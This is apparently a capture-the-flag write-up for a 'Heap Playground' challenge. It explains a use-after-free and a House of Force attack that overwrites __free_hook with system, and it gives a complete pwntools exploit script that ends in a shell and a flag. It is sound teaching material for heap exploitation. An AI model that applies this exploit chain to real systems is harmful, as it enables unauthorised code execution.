# Heap Playground

## Challenge

The program allows us to create, delete, and view allocations.

```
Welcome to the heap playground!
It's a secure environment designed to teach
you about the glibc heap allocator!

[ HEAP PLAYGROUND ]
1. Create
2. Delete
3. View
4. Exit
> 
```

## Solution

The program does not check that an index has not been freed when viewing or deleting.
This is a use-after-free vulnerability.

We get a heap leak by freeing some chunks into the fast bin, then viewing the contents.

We get a libc leak by freeing a chunk into the unsorted bin, then viewing the contents.

By double-freeing chunks in the fast bin, we can use the create function to edit the contents of the chunk metadata.
This is done to create a fake chunk within the heap, such that it's contents overlap with the wilderness size.

We can then overwrite the wilderness size with a very large value.
Then we proceed with the House of Force exploitation strategy.

A chunk with a very large size is allocated to move the next chunk to a target for overwriting.
This would normally fail for being too large, however, overwriting the wilderness size bypasses this.

Our overwrite target is above `__free_hook`, however, we have to be careful to restore the overwriten structures in this area.
We overwrite `__free_hook` with a pointer to `system` and include the string "/bin/sh" at the start of the chunk.
When freeing this chunk, we are granted a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 heap_playground
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'heap_playground')
libc = ELF('./glibc/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc'

io = start()

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'0')
io.sendlineafter(b':\n', b'24')
io.sendlineafter(b':\n', b'')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'1')
io.sendlineafter(b':\n', b'2048')
io.sendlineafter(b':\n', b'')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'2')
io.sendlineafter(b':\n', b'24')
io.sendafter(b':\n', flat({0x8: 0x21}))

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b':\n', b'0')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b':\n', b'1')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b':\n', b'2')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b':\n', b'0')

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b':\n', b'0')

io.recvuntil(b': ')
leak = unpack(io.recvuntil(b'\n\n', drop=True), 'all')
print(hex(leak))
heap = leak - 0x830

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b':\n', b'1')

io.recvuntil(b': ')
leak = unpack(io.recvuntil(b'\n\n', drop=True), 'all')
print(hex(leak))
libc.address = leak - 0x3c3b78
print('libc: ' + hex(libc.address))
print('__free_hook: ' + hex(libc.sym['__free_hook']))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'3')
io.sendlineafter(b':\n', b'8')
io.sendafter(b':\n', pack(heap + 0x840))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'4')
io.sendlineafter(b':\n', b'24')
io.sendlineafter(b':\n', b'')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'5')
io.sendlineafter(b':\n', b'24')
io.sendlineafter(b':\n', b'')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'6')
io.sendlineafter(b':\n', b'24')
io.sendafter(b':\n', flat({0x8: 0xffffffffffffffff}))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'7')
io.sendlineafter(b':\n', str(libc.sym['__free_hook'] - (heap + 0x8b0)).encode())
io.sendlineafter(b':\n', b'')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b':\n', b'8')
io.sendlineafter(b':\n', b'8000')
io.sendafter(
        b':\n',
        flat({
            0x0: b'/bin/sh\0',
            0x30: 0x0000000200000000,
            0x38: libc.address + 0x73b700,
            0x48: libc.sym['system'],
        }, filler=b'\0'
))

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b':\n', b'8')

io.interactive()
```

## Flag

```
HTB{y0u_w3r3_n0t_suPp0s3d_t0_3sc4p3}
```
